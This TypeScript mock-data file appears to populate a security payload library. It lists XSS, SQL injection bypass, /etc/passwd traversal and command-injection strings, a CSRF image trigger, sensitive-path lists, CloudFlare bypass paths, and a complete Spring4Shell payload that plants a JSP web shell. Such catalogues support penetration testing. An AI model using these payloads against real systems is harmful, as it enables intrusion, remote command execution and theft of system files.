
import { Payload, PayloadCategory } from "@/types/payload";

export const mockPayloads: Payload[] = [
  {
    id: "1",
    name: "Basic XSS Payload",
    content: "<script>alert('XSS')</script>",
    category: "Cross-Site Scripting (XSS)",
    categoryId: "xss",
    description: "A simple XSS payload to demonstrate alert box execution",
    path: "XSS-Payloads/basic-alert.txt",
    severity: "medium",
    tags: ["xss", "basic", "javascript"]
  },
  {
    id: "2",
    name: "SQL Injection Authentication Bypass",
    content: "' OR 1=1; --",
    category: "SQL Injection",
    categoryId: "sql",
    description: "Authentication bypass payload using OR condition",
    path: "public/assets/payloads/sql.txt",
    severity: "high",
    tags: ["sql", "authentication", "bypass"]
  },
  {
    id: "3",
    name: "Directory Traversal Simple",
    content: "../../../etc/passwd",
    category: "Directory Traversal",
    categoryId: "traversal",
    description: "Basic path traversal to access system files",
    path: "Directory-Traversal-Payloads/etc-passwd.txt",
    severity: "high",
    tags: ["lfi", "traversal", "unix"]
  },
  {
    id: "4",
    name: "Basic Command Injection",
    content: "; cat /etc/passwd",
    category: "Command Injection",
    categoryId: "command",
    description: "Simple command injection with command chaining",
    path: "Command-Injection/basic.txt",
    severity: "critical",
    tags: ["command", "injection", "rce"]
  },
  {
    id: "5",
    name: "CSRF Token Bypass",
    content: "<img src=\"http://example.com/api/action?param=value\" width=\"0\" height=\"0\" border=\"0\">",
    category: "Cross-Site Request Forgery (CSRF)",
    categoryId: "csrf",
    description: "Hidden image tag to trigger actions without user consent",
    path: "CSRF-Payloads/image-trigger.txt",
    severity: "medium",
    tags: ["csrf", "bypass"]
  },
  {
    id: "6",
    name: "HeapDump Path Traversal",
    content: "/heapdump\n/admin/heapdump\n/manage/heapdump\n/actuator/heapdump\n/solr\n/Search-Replace-DB/\n/Search-Replace-DB-master/\n/adminer.sql\n/composer.json\n/manifest.json\n/temp/\n/data/\n/cgi-bin/ %2e%2e%2e%2e%2e/etc/passwd",
    category: "Path Traversal",
    categoryId: "traversal",
    description: "Common paths used in path traversal attacks to access sensitive files",
    path: "Path-Traversal/heapdump.txt",
    severity: "critical",
    tags: ["path-traversal", "heapdump", "sensitive-files"]
  },
  {
    id: "7",
    name: "Spring4Shell RCE",
    content: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
    category: "RCE",
    categoryId: "rce",
    description: "Remote Code Execution payload for Spring4Shell vulnerability",
    path: "RCE-Payloads/spring4shell.txt",
    severity: "critical",
    tags: ["rce", "spring", "java", "vulnerability"]
  },
  {
    id: "8",
    name: "CloudFlare Bypass",
    content: "site.com/cdn-cgi/trace\nsite.com/cdn-cgi/l/email-protection\nsite.com/cdn-cgi/l/email-protection#1a696f6a6a75686e5a7d777b737634797577\nsite.com/cdn-cgi/pe/bag2?r[]=",
    category: "Bypass",
    categoryId: "bypass",
    description: "Methods to bypass CloudFlare protection",
    path: "Bypass-Payloads/cloudflare.txt",
    severity: "medium",
    tags: ["bypass", "cloudflare", "security"]
  }
];

export const mockPayloadCategories: PayloadCategory[] = [
  {
    id: "xss",
    name: "Cross-Site Scripting (XSS)",
    count: 1,
    description: "Exploits that allow injection of client-side scripts into web pages"
  },
  {
    id: "sql",
    name: "SQL Injection",
    count: 1,
    description: "Exploits that allow manipulation of database queries"
  },
  {
    id: "traversal",
    name: "Directory Traversal",
    count: 2,
    description: "Exploits that allow accessing files outside intended directories"
  },
  {
    id: "command",
    name: "Command Injection",
    count: 1,
    description: "Exploits that allow execution of system commands"
  },
  {
    id: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    count: 1,
    description: "Exploits that force users to execute unwanted actions"
  },
  {
    id: "rce",
    name: "Remote Code Execution",
    count: 1,
    description: "Exploits that allow execution of arbitrary code on a target system"
  },
  {
    id: "bypass",
    name: "Security Bypass",
    count: 1,
    description: "Techniques to bypass security controls and protections"
  }
];
